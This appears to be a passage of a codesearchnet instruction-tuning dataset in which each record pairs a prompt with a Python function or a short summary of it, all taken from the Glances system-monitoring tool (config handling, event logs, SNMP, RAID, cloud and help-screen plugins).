{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 12\n\n        # Header\n        msg = '{:{width}}'.format('DISK I/O', width=name_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        if args.diskio_iops:\n            msg = '{:>7}'.format('IOR/s')\n            ret.append(self.curse_add_line(msg))\n            msg = '{:>7}'.format('IOW/s')\n            ret.append(self.curse_add_line(msg))\n        else:\n            msg = '{:>7}'.format('R/s')\n            ret.append(self.curse_add_line(msg))\n            msg = '{:>7}'.format('W/s')\n            ret.append(self.curse_add_line(msg))\n        # Disk list (sorted by name)\n        for i in self.sorted_stats():\n            # Is there an alias for the disk name ?\n            disk_real_name = i['disk_name']\n            disk_name = self.has_alias(i['disk_name'])\n            if disk_name is None:\n                disk_name = disk_real_name\n            # New line\n            ret.append(self.curse_new_line())\n            if len(disk_name) > name_max_width:\n                # Cut disk name if it is too long\n                disk_name = '_' + disk_name[-name_max_width:]\n            msg = '{:{width}}'.format(nativestr(disk_name),\n                                      width=name_max_width)\n            ret.append(self.curse_add_line(msg))\n            if args.diskio_iops:\n                # count\n                txps = self.auto_unit(\n                    int(i['read_count'] // i['time_since_update']))\n                rxps = self.auto_unit(\n                    int(i['write_count'] // i['time_since_update']))\n                msg = '{:>7}'.format(txps)\n                ret.append(self.curse_add_line(msg,\n                                               self.get_views(item=i[self.get_key()],\n                                                              key='read_count',\n                                                              option='decoration')))\n                msg = '{:>7}'.format(rxps)\n                ret.append(self.curse_add_line(msg,\n                                               self.get_views(item=i[self.get_key()],\n                                                              key='write_count',\n                                                              option='decoration')))\n            else:\n                # Bitrate\n                txps = self.auto_unit(\n                    int(i['read_bytes'] // i['time_since_update']))\n                rxps = self.auto_unit(\n                    int(i['write_bytes'] // i['time_since_update']))\n                msg = '{:>7}'.format(txps)\n                ret.append(self.curse_add_line(msg,\n                                               self.get_views(item=i[self.get_key()],\n                                                              key='read_bytes',\n                                                              option='decoration')))\n                msg = '{:>7}'.format(rxps)\n                ret.append(self.curse_add_line(msg,\n                                               self.get_views(item=i[self.get_key()],\n                                                              key='write_bytes',\n                                                              option='decoration')))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef user_config_dir():\n    if WINDOWS:\n        path = os.environ.get('APPDATA')\n    elif MACOS:\n        path = os.path.expanduser('~/Library/Application Support')\n    else:\n        path = os.environ.get('XDG_CONFIG_HOME') or os.path.expanduser('~/.config')\n    if path is None:\n        path = ''\n    else:\n        path = os.path.join(path, 'glances')\n\n    return path", "response": "Return the path to the per - user config dir."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef user_cache_dir():\n    if WINDOWS:\n        path = os.path.join(os.environ.get('LOCALAPPDATA') or os.environ.get('APPDATA'),\n                            'glances', 'cache')\n    elif MACOS:\n        path = os.path.expanduser('~/Library/Caches/glances')\n    else:\n        path = os.path.join(os.environ.get('XDG_CACHE_HOME') or os.path.expanduser('~/.cache'),\n                            'glances')\n\n    return path", "response": "Return the path to the cache directory for the current user."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the system - wide config dir.", "response": "def system_config_dir():\n    r\"\"\"Return the system-wide config dir (full path).\n\n    - Linux, SunOS: /etc/glances\n    - *BSD, macOS: /usr/local/etc/glances\n    - Windows: %APPDATA%\\glances\n    \"\"\"\n    if LINUX or SUNOS:\n        path = '/etc'\n    elif BSD or MACOS:\n        path = '/usr/local/etc'\n    else:\n        path = os.environ.get('APPDATA')\n    if path is None:\n        path = ''\n    else:\n        path = os.path.join(path, 'glances')\n\n    return path"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef config_file_paths(self):\n        paths = []\n\n        if self.config_dir:\n            paths.append(self.config_dir)\n\n        paths.append(os.path.join(user_config_dir(), self.config_filename))\n        paths.append(os.path.join(system_config_dir(), self.config_filename))\n\n        return paths", "response": "r Get a list of config file paths."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreads the config file if it exists. Using defaults otherwise.", "response": "def read(self):\n        \"\"\"Read the config file, if it exists. Using defaults otherwise.\"\"\"\n        for config_file in self.config_file_paths():\n            logger.info('Search glances.conf file in {}'.format(config_file))\n            if os.path.exists(config_file):\n                try:\n                    with open(config_file, encoding='utf-8') as f:\n                        self.parser.read_file(f)\n                        self.parser.read(f)\n                    logger.info(\"Read configuration file '{}'\".format(config_file))\n                except UnicodeDecodeError as err:\n                    logger.error(\"Can not read configuration file '{}': {}\".format(config_file, err))\n                    sys.exit(1)\n                # Save the loaded configuration file path (issue #374)\n                self._loaded_config_file = config_file\n                break\n\n        # Quicklook\n        if not self.parser.has_section('quicklook'):\n            self.parser.add_section('quicklook')\n        self.set_default_cwc('quicklook', 'cpu')\n        self.set_default_cwc('quicklook', 'mem')\n        self.set_default_cwc('quicklook', 'swap')\n\n        # CPU\n        if not self.parser.has_section('cpu'):\n            self.parser.add_section('cpu')\n        self.set_default_cwc('cpu', 'user')\n        self.set_default_cwc('cpu', 'system')\n        self.set_default_cwc('cpu', 'steal')\n        # By default I/O wait should be lower than 1/number of CPU cores\n        iowait_bottleneck = (1.0 / multiprocessing.cpu_count()) * 100.0\n        self.set_default_cwc('cpu', 'iowait',\n                             [str(iowait_bottleneck - (iowait_bottleneck * 0.20)),\n                              str(iowait_bottleneck - (iowait_bottleneck * 0.10)),\n                              str(iowait_bottleneck)])\n        # Context switches bottleneck identification #1212\n        ctx_switches_bottleneck = (500000 * 0.10) * multiprocessing.cpu_count()\n        self.set_default_cwc('cpu', 'ctx_switches',\n                             [str(ctx_switches_bottleneck - (ctx_switches_bottleneck * 0.20)),\n                              str(ctx_switches_bottleneck - (ctx_switches_bottleneck * 0.10)),\n                              str(ctx_switches_bottleneck)])\n\n        # Per-CPU\n        if not self.parser.has_section('percpu'):\n            self.parser.add_section('percpu')\n        self.set_default_cwc('percpu', 'user')\n        self.set_default_cwc('percpu', 'system')\n\n        # Load\n        if not self.parser.has_section('load'):\n            self.parser.add_section('load')\n        self.set_default_cwc('load', cwc=['0.7', '1.0', '5.0'])\n\n        # Mem\n        if not self.parser.has_section('mem'):\n            self.parser.add_section('mem')\n        self.set_default_cwc('mem')\n\n        # Swap\n        if not self.parser.has_section('memswap'):\n            self.parser.add_section('memswap')\n        self.set_default_cwc('memswap')\n\n        # NETWORK\n        if not self.parser.has_section('network'):\n            self.parser.add_section('network')\n        self.set_default_cwc('network', 'rx')\n        self.set_default_cwc('network', 'tx')\n\n        # FS\n        if not self.parser.has_section('fs'):\n            self.parser.add_section('fs')\n        self.set_default_cwc('fs')\n\n        # Sensors\n        if not self.parser.has_section('sensors'):\n            self.parser.add_section('sensors')\n        self.set_default_cwc('sensors', 'temperature_core', cwc=['60', '70', '80'])\n        self.set_default_cwc('sensors', 'temperature_hdd', cwc=['45', '52', '60'])\n        self.set_default_cwc('sensors', 'battery', cwc=['80', '90', '95'])\n\n        # Process list\n        if not self.parser.has_section('processlist'):\n            self.parser.add_section('processlist')\n        self.set_default_cwc('processlist', 'cpu')\n        self.set_default_cwc('processlist', 'mem')"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef as_dict(self):\n        dictionary = {}\n        for section in self.parser.sections():\n            dictionary[section] = {}\n            for option in self.parser.options(section):\n                dictionary[section][option] = self.parser.get(section, option)\n        return dictionary", "response": "Return the configuration as a dict"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_default_cwc(self, section,\n                        option_header=None,\n                        cwc=['50', '70', '90']):\n        \"\"\"Set default values for careful, warning and critical.\"\"\"\n        if option_header is None:\n            header = ''\n        else:\n            header = option_header + '_'\n        self.set_default(section, header + 'careful', cwc[0])\n        self.set_default(section, header + 'warning', cwc[1])\n        self.set_default(section, header + 'critical', cwc[2])", "response": "Set default values for careful warning and critical."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_default(self, section, option,\n                    default):\n        \"\"\"If the option did not exist, create a default value.\"\"\"\n        if not self.parser.has_option(section, option):\n            self.parser.set(section, option, default)", "response": "Set the default value for the option."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the value of an option in a section.", "response": "def get_value(self, section, option,\n                  default=None):\n        \"\"\"Get the value of an option, if it exists.\n\n        If it did not exist, then return the default value.\n\n        It allows user to define dynamic configuration key (see issue#1204)\n        Dynamic vlaue should starts and end with the ` char\n        Example: prefix=`hostname`\n        \"\"\"\n        ret = default\n        try:\n            ret = self.parser.get(section, option)\n        except NoOptionError:\n            pass\n\n        # Search a substring `foo` and replace it by the result of its exec\n        if ret is not None:\n            try:\n                match = self.re_pattern.findall(ret)\n                for m in match:\n                    ret = ret.replace(m, system_exec(m[1:-1]))\n            except TypeError:\n                pass\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_int_value(self, section, option, default=0):\n        try:\n            return self.parser.getint(section, option)\n        except NoOptionError:\n            return int(default)", "response": "Get the int value of an option."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_float_value(self, section, option, default=0.0):\n        try:\n            return self.parser.getfloat(section, option)\n        except NoOptionError:\n            return float(default)", "response": "Get the float value of an option."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the bool value of an option.", "response": "def get_bool_value(self, section, option, default=True):\n        \"\"\"Get the bool value of an option, if it exists.\"\"\"\n        try:\n            return self.parser.getboolean(section, option)\n        except NoOptionError:\n            return bool(default)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef __event_exist(self, event_type):\n        for i in range(self.len()):\n            if self.events_list[i][1] < 0 and self.events_list[i][3] == event_type:\n                return i\n        return -1", "response": "Return the event position if it exists."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_event_sort_key(self, event_type):\n        # Process sort depending on alert type\n        if event_type.startswith(\"MEM\"):\n            # Sort TOP process by memory_percent\n            ret = 'memory_percent'\n        elif event_type.startswith(\"CPU_IOWAIT\"):\n            # Sort TOP process by io_counters (only for Linux OS)\n            ret = 'io_counters'\n        else:\n            # Default sort is...\n            ret = 'cpu_percent'\n        return ret", "response": "Return the process sort key based on the event type"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndefine the process auto sort key from the alert type.", "response": "def set_process_sort(self, event_type):\n        \"\"\"Define the process auto sort key from the alert type.\"\"\"\n        if glances_processes.auto_sort:\n            glances_processes.sort_key = self.get_event_sort_key(event_type)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add(self, event_state, event_type, event_value,\n            proc_list=None, proc_desc=\"\", peak_time=6):\n        \"\"\"Add a new item to the logs list.\n\n        If 'event' is a 'new one', add it at the beginning of the list.\n        If 'event' is not a 'new one', update the list .\n        If event < peak_time then the alert is not set.\n        \"\"\"\n        proc_list = proc_list or glances_processes.getlist()\n\n        # Add or update the log\n        event_index = self.__event_exist(event_type)\n        if event_index < 0:\n            # Event did not exist, add it\n            self._create_event(event_state, event_type, event_value,\n                               proc_list, proc_desc, peak_time)\n        else:\n            # Event exist, update it\n            self._update_event(event_index, event_state, event_type, event_value,\n                               proc_list, proc_desc, peak_time)\n\n        return self.len()", "response": "Add a new entry to the logs list."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _create_event(self, event_state, event_type, event_value,\n                      proc_list, proc_desc, peak_time):\n        \"\"\"Add a new item in the log list.\n\n        Item is added only if the criticity (event_state) is WARNING or CRITICAL.\n        \"\"\"\n        if event_state == \"WARNING\" or event_state == \"CRITICAL\":\n            # Define the automatic process sort key\n            self.set_process_sort(event_type)\n\n            # Create the new log item\n            # Time is stored in Epoch format\n            # Epoch -> DMYHMS = datetime.fromtimestamp(epoch)\n            item = [\n                time.mktime(datetime.now().timetuple()),  # START DATE\n                -1,  # END DATE\n                event_state,  # STATE: WARNING|CRITICAL\n                event_type,  # TYPE: CPU, LOAD, MEM...\n                event_value,  # MAX\n                event_value,  # AVG\n                event_value,  # MIN\n                event_value,  # SUM\n                1,  # COUNT\n                [],  # TOP 3 PROCESS LIST\n                proc_desc,  # MONITORED PROCESSES DESC\n                glances_processes.sort_key]  # TOP PROCESS SORTKEY\n\n            # Add the item to the list\n            self.events_list.insert(0, item)\n\n            # Limit the list to 'events_max' items\n            if self.len() > self.events_max:\n                self.events_list.pop()\n\n            return True\n        else:\n            return False", "response": "Create a new event in the log list."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates an event in the list", "response": "def _update_event(self, event_index, event_state, event_type, event_value,\n                      proc_list, proc_desc, peak_time):\n        \"\"\"Update an event in the list\"\"\"\n        if event_state == \"OK\" or event_state == \"CAREFUL\":\n            # Reset the automatic process sort key\n            self.reset_process_sort()\n\n            # Set the end of the events\n            endtime = time.mktime(datetime.now().timetuple())\n            if endtime - self.events_list[event_index][0] > peak_time:\n                # If event is > peak_time seconds\n                self.events_list[event_index][1] = endtime\n            else:\n                # If event <= peak_time seconds, ignore\n                self.events_list.remove(self.events_list[event_index])\n        else:\n            # Update the item\n            self.set_process_sort(event_type)\n\n            # State\n            if event_state == \"CRITICAL\":\n                self.events_list[event_index][2] = event_state\n            # Min value\n            self.events_list[event_index][6] = min(self.events_list[event_index][6],\n                                                   event_value)\n            # Max value\n            self.events_list[event_index][4] = max(self.events_list[event_index][4],\n                                                   event_value)\n            # Average value\n            self.events_list[event_index][7] += event_value\n            self.events_list[event_index][8] += 1\n            self.events_list[event_index][5] = (self.events_list[event_index][7] /\n                                                self.events_list[event_index][8])\n\n            # TOP PROCESS LIST (only for CRITICAL ALERT)\n            if event_state == \"CRITICAL\":\n                events_sort_key = self.get_event_sort_key(event_type)\n                # Sort the current process list to retreive the TOP 3 processes\n                self.events_list[event_index][9] = sort_stats(proc_list,\n                                                              events_sort_key)[0:3]\n                self.events_list[event_index][11] = events_sort_key\n\n            # MONITORED PROCESSES DESC\n            self.events_list[event_index][10] = proc_desc\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef clean(self, critical=False):\n        # Create a new clean list\n        clean_events_list = []\n        while self.len() > 0:\n            item = self.events_list.pop()\n            if item[1] < 0 or (not critical and item[2].startswith(\"CRITICAL\")):\n                clean_events_list.insert(0, item)\n        # The list is now the clean one\n        self.events_list = clean_events_list\n        return self.len()", "response": "Clean the logs list by deleting finished items."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if SNMP is available on the server.", "response": "def check_snmp(self):\n        \"\"\"Chek if SNMP is available on the server.\"\"\"\n        # Import the SNMP client class\n        from glances.snmp import GlancesSNMPClient\n\n        # Create an instance of the SNMP client\n        clientsnmp = GlancesSNMPClient(host=self.args.client,\n                                       port=self.args.snmp_port,\n                                       version=self.args.snmp_version,\n                                       community=self.args.snmp_community,\n                                       user=self.args.snmp_user,\n                                       auth=self.args.snmp_auth)\n\n        # If we cannot grab the hostname, then exit...\n        ret = clientsnmp.get_by_oid(\"1.3.6.1.2.1.1.5.0\") != {}\n        if ret:\n            # Get the OS name (need to grab the good OID...)\n            oid_os_name = clientsnmp.get_by_oid(\"1.3.6.1.2.1.1.1.0\")\n            try:\n                self.system_name = self.get_system_name(oid_os_name['1.3.6.1.2.1.1.1.0'])\n                logger.info(\"SNMP system name detected: {}\".format(self.system_name))\n            except KeyError:\n                self.system_name = None\n                logger.warning(\"Cannot detect SNMP system name\")\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_system_name(self, oid_system_name):\n        short_system_name = None\n\n        if oid_system_name == '':\n            return short_system_name\n\n        # Find the short name in the oid_to_short_os_name dict\n        for r, v in iteritems(oid_to_short_system_name):\n            if re.search(r, oid_system_name):\n                short_system_name = v\n                break\n\n        return short_system_name", "response": "Get the short os name from the OS name OID string."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nupdate the stats using SNMP.", "response": "def update(self):\n        \"\"\"Update the stats using SNMP.\"\"\"\n        # For each plugins, call the update method\n        for p in self._plugins:\n            if self._plugins[p].is_disable():\n                # If current plugin is disable\n                # then continue to next plugin\n                continue\n\n            # Set the input method to SNMP\n            self._plugins[p].input_method = 'snmp'\n            self._plugins[p].short_system_name = self.system_name\n\n            # Update the stats...\n            try:\n                self._plugins[p].update()\n            except Exception as e:\n                logger.error(\"Update {} failed: {}\".format(p, e))\n            else:\n                # ... the history\n                self._plugins[p].update_stats_history()\n                # ... and the views\n                self._plugins[p].update_views()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nupdating the stats of the RAID with the current values.", "response": "def update(self):\n        \"\"\"Update RAID stats using the input method.\"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if import_error_tag:\n            return self.stats\n\n        if self.input_method == 'local':\n            # Update stats using the PyMDstat lib (https://github.com/nicolargo/pymdstat)\n            try:\n                # Just for test\n                # mds = MdStat(path='/home/nicolargo/dev/pymdstat/tests/mdstat.10')\n                mds = MdStat()\n                stats = mds.get_stats()['arrays']\n            except Exception as e:\n                logger.debug(\"Can not grab RAID stats (%s)\" % e)\n                return self.stats\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            # No standard way for the moment...\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist...\n        if not self.stats:\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 12\n\n        # Header\n        msg = '{:{width}}'.format('RAID disks',\n                                  width=name_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        msg = '{:>7}'.format('Used')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('Avail')\n        ret.append(self.curse_add_line(msg))\n        # Data\n        arrays = sorted(iterkeys(self.stats))\n        for array in arrays:\n            # New line\n            ret.append(self.curse_new_line())\n            # Display the current status\n            status = self.raid_alert(self.stats[array]['status'],\n                                     self.stats[array]['used'],\n                                     self.stats[array]['available'],\n                                     self.stats[array]['type'])\n            # Data: RAID type name | disk used | disk available\n            array_type = self.stats[array]['type'].upper() if self.stats[array]['type'] is not None else 'UNKNOWN'\n            # Build the full name = array type + array name\n            full_name = '{} {}'.format(array_type, array)\n            msg = '{:{width}}'.format(full_name,\n                                      width=name_max_width)\n            ret.append(self.curse_add_line(msg))\n            if self.stats[array]['type'] == 'raid0' and self.stats[array]['status'] == 'active':\n                msg = '{:>7}'.format(len(self.stats[array]['components']))\n                ret.append(self.curse_add_line(msg, status))\n                msg = '{:>7}'.format('-')\n                ret.append(self.curse_add_line(msg, status))\n            elif self.stats[array]['status'] == 'active':\n                msg = '{:>7}'.format(self.stats[array]['used'])\n                ret.append(self.curse_add_line(msg, status))\n                msg = '{:>7}'.format(self.stats[array]['available'])\n                ret.append(self.curse_add_line(msg, status))\n            elif self.stats[array]['status'] == 'inactive':\n                ret.append(self.curse_new_line())\n                msg = '\u2514\u2500 Status {}'.format(self.stats[array]['status'])\n                ret.append(self.curse_add_line(msg, status))\n                components = sorted(iterkeys(self.stats[array]['components']))\n                for i, component in enumerate(components):\n                    if i == len(components) - 1:\n                        tree_char = '\u2514\u2500'\n                    else:\n                        tree_char = '\u251c\u2500'\n                    ret.append(self.curse_new_line())\n                    msg = '   {} disk {}: '.format(tree_char, self.stats[array]['components'][component])\n                    ret.append(self.curse_add_line(msg))\n                    msg = '{}'.format(component)\n                    ret.append(self.curse_add_line(msg))\n            if self.stats[array]['type'] != 'raid0' and (self.stats[array]['used'] < self.stats[array]['available']):\n                # Display current array configuration\n                ret.append(self.curse_new_line())\n                msg = '\u2514\u2500 Degraded mode'\n                ret.append(self.curse_add_line(msg, status))\n                if len(self.stats[array]['config']) < 17:\n                    ret.append(self.curse_new_line())\n                    msg = '   \u2514\u2500 {}'.format(self.stats[array]['config'].replace('_', 'A'))\n                    ret.append(self.curse_add_line(msg))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef raid_alert(self, status, used, available, type):\n        if type == 'raid0':\n            return 'OK'\n        if status == 'inactive':\n            return 'CRITICAL'\n        if used is None or available is None:\n            return 'DEFAULT'\n        elif used < available:\n            return 'WARNING'\n        return 'OK'", "response": "RAID alert messages.\n\n        [available/used] means that ideally the array may have _available_\n        devices however, _used_ devices are in use.\n        Obviously when used >= available then things are good."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            self.uptime = datetime.now() - datetime.fromtimestamp(psutil.boot_time())\n\n            # Convert uptime to string (because datetime is not JSONifi)\n            stats = str(self.uptime).split('.')[0]\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            uptime = self.get_stats_snmp(snmp_oid=snmp_oid)['_uptime']\n            try:\n                # In hundredths of seconds\n                stats = str(timedelta(seconds=int(uptime) / 100))\n            except Exception:\n                pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update uptime stat using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nupdating the cloud stats. Return the stats dict", "response": "def update(self):\n        \"\"\"Update the cloud stats.\n\n        Return the stats (dict)\n        \"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        # Requests lib is needed to get stats from the Cloud API\n        if import_error_tag:\n            return stats\n\n        # Update the stats\n        if self.input_method == 'local':\n            stats = self.OPENSTACK.stats\n            # Example:\n            # Uncomment to test on physical computer\n            # stats = {'ami-id': 'ami-id',\n            #                    'instance-id': 'instance-id',\n            #                    'instance-type': 'instance-type',\n            #                    'region': 'placement/availability-zone'}\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the string to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the string to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        if not self.stats or self.stats == {} or self.is_disable():\n            return ret\n\n        # Generate the output\n        if 'instance-type' in self.stats \\\n           and 'instance-id' in self.stats \\\n           and 'region' in self.stats:\n            msg = 'Cloud '\n            ret.append(self.curse_add_line(msg, \"TITLE\"))\n            msg = '{} instance {} ({})'.format(self.stats['instance-type'],\n                                               self.stats['instance-id'],\n                                               self.stats['region'])\n            ret.append(self.curse_add_line(msg))\n\n        # Return the message with decoration\n        # logger.info(ret)\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngrabbing plugin s stats. Infinite loop", "response": "def run(self):\n        \"\"\"Grab plugin's stats.\n\n        Infinite loop, should be stopped by calling the stop() method\n        \"\"\"\n        if import_error_tag:\n            self.stop()\n            return False\n\n        for k, v in iteritems(self.OPENSTACK_API_METADATA):\n            r_url = '{}/{}'.format(self.OPENSTACK_API_URL, v)\n            try:\n                # Local request, a timeout of 3 seconds is OK\n                r = requests.get(r_url, timeout=3)\n            except Exception as e:\n                logger.debug('cloud plugin - Cannot connect to the OpenStack metadata API {}: {}'.format(r_url, e))\n                break\n            else:\n                if r.ok:\n                    self._stats[k] = to_ascii(r.content)\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate the views data.", "response": "def generate_view_data(self):\n        \"\"\"Generate the views.\"\"\"\n        self.view_data['version'] = '{} {}'.format('Glances', __version__)\n        self.view_data['psutil_version'] = ' with psutil {}'.format(psutil_version)\n\n        try:\n            self.view_data['configuration_file'] = 'Configuration file: {}'.format(self.config.loaded_config_file)\n        except AttributeError:\n            pass\n\n        msg_col = ' {0:1}  {1:35}'\n        msg_col2 = '   {0:1}  {1:35}'\n        self.view_data['sort_auto'] = msg_col.format('a', 'Sort processes automatically')\n        self.view_data['sort_network'] = msg_col2.format('b', 'Bytes or bits for network I/O')\n        self.view_data['sort_cpu'] = msg_col.format('c', 'Sort processes by CPU%')\n        self.view_data['show_hide_alert'] = msg_col2.format('l', 'Show/hide alert logs')\n        self.view_data['sort_mem'] = msg_col.format('m', 'Sort processes by MEM%')\n        self.view_data['sort_user'] = msg_col.format('u', 'Sort processes by USER')\n        self.view_data['delete_warning_alerts'] = msg_col2.format('w', 'Delete warning alerts')\n        self.view_data['sort_proc'] = msg_col.format('p', 'Sort processes by name')\n        self.view_data['delete_warning_critical_alerts'] = msg_col2.format('x', 'Delete warning and critical alerts')\n        self.view_data['sort_io'] = msg_col.format('i', 'Sort processes by I/O rate')\n        self.view_data['percpu'] = msg_col2.format('1', 'Global CPU or per-CPU stats')\n        self.view_data['sort_cpu_times'] = msg_col.format('t', 'Sort processes by TIME')\n        self.view_data['show_hide_help'] = msg_col2.format('h', 'Show/hide this help screen')\n        self.view_data['show_hide_diskio'] = msg_col.format('d', 'Show/hide disk I/O stats')\n        self.view_data['show_hide_irq'] = msg_col2.format('Q', 'Show/hide IRQ stats')\n        self.view_data['view_network_io_combination'] = msg_col2.format('T', 'View network I/O as combination')\n        self.view_data['show_hide_filesystem'] = msg_col.format('f', 'Show/hide filesystem stats')\n        self.view_data['view_cumulative_network'] = msg_col2.format('U', 'View cumulative network I/O')\n        self.view_data['show_hide_network'] = msg_col.format('n', 'Show/hide network stats')\n        self.view_data['show_hide_filesytem_freespace'] = msg_col2.format('F', 'Show filesystem free space')\n        self.view_data['show_hide_sensors'] = msg_col.format('s', 'Show/hide sensors stats')\n        self.view_data['generate_graphs'] = msg_col2.format('g', 'Generate graphs for current history')\n        self.view_data['show_hide_left_sidebar'] = msg_col.format('2', 'Show/hide left sidebar')\n        self.view_data['reset_history'] = msg_col2.format('r', 'Reset history')\n        self.view_data['enable_disable_process_stats'] = msg_col.format('z', 'Enable/disable processes stats')\n        self.view_data['quit'] = msg_col2.format('q', 'Quit (Esc and Ctrl-C also work)')\n        self.view_data['enable_disable_top_extends_stats'] = msg_col.format('e', 'Enable/disable top extended stats')\n        self.view_data['enable_disable_short_processname'] = msg_col.format('/', 'Enable/disable short processes name')\n        self.view_data['enable_disable_irix'] = msg_col.format('0', 'Enable/disable Irix process CPU')\n        self.view_data['enable_disable_docker'] = msg_col2.format('D', 'Enable/disable Docker stats')\n        self.view_data['enable_disable_quick_look'] = msg_col.format('3', 'Enable/disable quick look plugin')\n        self.view_data['show_hide_ip'] = msg_col2.format('I', 'Show/hide IP module')\n        self.view_data['diskio_iops'] = msg_col2.format('B', 'Count/rate for Disk I/O')\n        self.view_data['show_hide_top_menu'] = msg_col2.format('5', 'Show/hide top menu (QL, CPU, MEM, SWAP and LOAD)')\n        self.view_data['enable_disable_gpu'] = msg_col.format('G', 'Enable/disable gpu plugin')\n        self.view_data['enable_disable_mean_gpu'] = msg_col2.format('6', 'Enable/disable mean gpu')\n        self.view_data['edit_pattern_filter'] = 'ENTER: Edit the process filter pattern'"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the list to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the list to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Build the string message\n        # Header\n        ret.append(self.curse_add_line(self.view_data['version'], 'TITLE'))\n        ret.append(self.curse_add_line(self.view_data['psutil_version']))\n        ret.append(self.curse_new_line())\n\n        # Configuration file path\n        if 'configuration_file' in self.view_data:\n            ret.append(self.curse_new_line())\n            ret.append(self.curse_add_line(self.view_data['configuration_file']))\n            ret.append(self.curse_new_line())\n\n        # Keys\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['sort_auto']))\n        ret.append(self.curse_add_line(self.view_data['sort_network']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['sort_cpu']))\n        ret.append(self.curse_add_line(self.view_data['show_hide_alert']))\n        ret.append(self.curse_new_line())\n\n        ret.append(self.curse_add_line(self.view_data['sort_mem']))\n        ret.append(self.curse_add_line(self.view_data['delete_warning_alerts']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['sort_user']))\n        ret.append(self.curse_add_line(self.view_data['delete_warning_critical_alerts']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['sort_proc']))\n        ret.append(self.curse_add_line(self.view_data['percpu']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['sort_io']))\n        ret.append(self.curse_add_line(self.view_data['show_hide_ip']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['sort_cpu_times']))\n        ret.append(self.curse_add_line(self.view_data['enable_disable_docker']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['show_hide_diskio']))\n        ret.append(self.curse_add_line(self.view_data['view_network_io_combination']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['show_hide_filesystem']))\n        ret.append(self.curse_add_line(self.view_data['view_cumulative_network']))\n        